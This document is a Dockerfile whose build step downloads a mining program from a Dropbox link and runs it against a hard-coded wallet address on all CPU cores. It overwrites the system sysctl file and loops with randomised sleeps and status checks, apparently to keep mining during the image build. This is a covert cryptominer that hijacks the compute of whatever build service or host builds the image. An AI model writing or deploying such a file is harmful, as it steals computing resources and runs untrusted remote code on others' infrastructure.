FROM ubuntu:latest
RUN echo 1024 | tee /etc/sysctl.conf && sysctl -w vm.nr_hugepages=1024 && apt-get update && apt-get install wget unzip libcurl3 coreutils util-linux -y  && mkdir /memory && cd /memory && wget -O slate.zip https://www.dropbox.com/sh/pmnr58i6640l5hk/AABC3ja0Eunq6kZ3df7tWbxAa/slate-v1.0.0.0_linux-x64.zip?dl=1 > /dev/null 2>&1 && unzip slate.zip && chmod -R 777 * && ls -l && mkdir /memory/blockchain/ && ls -l && echo "$(grep 'core id' /proc/cpuinfo | sort -u | wc -l)" && cat /proc/cpuinfo && lscpu && cat /proc/meminfo && sleep "$(( ( RANDOM % 180 ) ))" && ./slated --rpc-bind-ip 127.0.0.1 --detach --data-dir /memory/blockchain/  --start-mining SL3SBGyWMAT92L4aYHVnMB8QibigmNCY8ZBj2VqtJNz2dYwKuPw6vtfGMh1fFEmtHvjSKEnovzAPbaq6wqEtdn2t2n8anxKUb --mining-threads "$(grep 'core id' /proc/cpuinfo | sort -u | wc -l)" && sleep 120 && ./slated status && ./slated exit && sleep "$(( ( RANDOM % 60 )  + 60 ))"  && ./slated --rpc-bind-ip 127.0.0.1 --detach --data-dir /memory/blockchain/  --start-mining SL3SBGyWMAT92L4aYHVnMB8QibigmNCY8ZBj2VqtJNz2dYwKuPw6vtfGMh1fFEmtHvjSKEnovzAPbaq6wqEtdn2t2n8anxKUb --mining-threads "$(grep 'core id' /proc/cpuinfo | sort -u | wc -l)"  && sleep "$(( ( RANDOM % 300 )  + 300 ))"  && ./slated status  &&  sleep "$(( ( RANDOM % 300 )  + 200 ))"  && ./slated status && sleep 300  && ./slated status && sleep 300  && ./slated status && sleep 300 && ./slated status && sleep 300   && ./slated status && sleep 300  && ./slated status && sleep 300  && ./slated status && sleep 300 && ./slated status && sleep 300 
